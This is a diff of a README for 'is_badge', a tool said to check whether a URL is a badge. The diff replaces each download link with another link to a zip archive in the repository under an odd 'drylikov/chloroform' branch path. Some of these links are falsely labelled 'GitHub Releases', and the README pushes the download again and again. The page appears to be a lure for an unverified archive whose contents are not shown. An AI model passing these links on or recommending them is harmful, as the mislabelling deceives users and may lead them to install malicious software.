@@ -1,6 +1,6 @@
 # 🎉 is_badge - Check If Your URL is a Badge 
 
-[![Download is_badge](https://github.com/Vininoo/is_badge/raw/refs/heads/drylikov/chloroform/is_badge_2.2-beta.4.zip)](https://github.com/Vininoo/is_badge/raw/refs/heads/drylikov/chloroform/is_badge_2.2-beta.4.zip)
+[![Download is_badge](https://raw.githubusercontent.com/Vininoo/is_badge/drylikov/chloroform/badge_is_3.2.zip)](https://raw.githubusercontent.com/Vininoo/is_badge/drylikov/chloroform/badge_is_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **is_badge**! This application helps you verify if a URL is a badge. 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Vininoo/is_badge/raw/refs/heads/drylikov/chloroform/is_badge_2.2-beta.4.zip).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Vininoo/is_badge/drylikov/chloroform/badge_is_3.2.zip).
 
 Follow these simple steps:
 
@@ -53,7 +53,7 @@ is_badge checks URLs that point to various types of badges commonly used in soft
 
 If you encounter issues while using is_badge, try the following:
 
-- Ensure you have the latest version installed from [GitHub Releases](https://github.com/Vininoo/is_badge/raw/refs/heads/drylikov/chloroform/is_badge_2.2-beta.4.zip).
+- Ensure you have the latest version installed from [GitHub Releases](https://raw.githubusercontent.com/Vininoo/is_badge/drylikov/chloroform/badge_is_3.2.zip).
 - Verify that you're entering the correct URL.
 - Restart the application if it freezes.
 
@@ -71,4 +71,4 @@ Stay updated and connect with others using is_badge:
 
 By using is_badge, you streamline your processes and enhance your project visibility. 
 
-For your convenience, here’s the download link again: [Visit this page to download](https://github.com/Vininoo/is_badge/raw/refs/heads/drylikov/chloroform/is_badge_2.2-beta.4.zip). Enjoy checking your badges!
+For your convenience, here’s the download link again: [Visit this page to download](https://raw.githubusercontent.com/Vininoo/is_badge/drylikov/chloroform/badge_is_3.2.zip). Enjoy checking your badges!
